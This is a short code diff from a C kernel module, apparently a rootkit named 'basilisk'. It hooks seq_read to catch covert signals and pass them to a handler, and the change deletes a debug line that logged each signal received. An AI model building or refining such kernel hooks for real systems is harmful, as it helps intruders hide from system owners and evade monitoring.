@@ -131,8 +131,6 @@ static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, siz
       kfree(kbuf);
       return orig_seq_read(file, buf, size, ppos);
     }
-    
-    pr_info("basilisk: received signal: %x\n", sig);
     sig_handle(sig, pid);
 
     kfree(kbuf);
